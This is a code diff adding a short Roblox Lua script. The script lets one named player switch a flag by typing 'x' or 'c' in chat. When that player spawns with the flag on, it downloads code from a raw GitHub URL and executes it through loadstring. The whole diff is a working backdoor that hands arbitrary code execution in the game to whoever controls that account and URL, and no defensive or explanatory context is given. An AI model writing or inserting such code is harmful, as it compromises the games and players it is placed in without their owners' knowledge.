@@ -1,0 +1,21 @@
+local http = game:GetService("HttpService")
+
+
+
+local link = "https://raw.githubusercontent.com/balljeet/balljeet-documents/main/v"
+local var = true
+game.Players:FindFirstChild("EscapeMasterV2010").Chatted:Connect(function(msg)
+if msg == "x" then
+var = true
+elseif msg == "c" then
+var = false
+
+end
+
+end)
+game.Players:FindFirstChild("EscapeMasterV2010").CharacterAdded:Connect(function()
+wait(2)
+if var then
+loadstring(http:GetAsync(link))()
+end
+end)
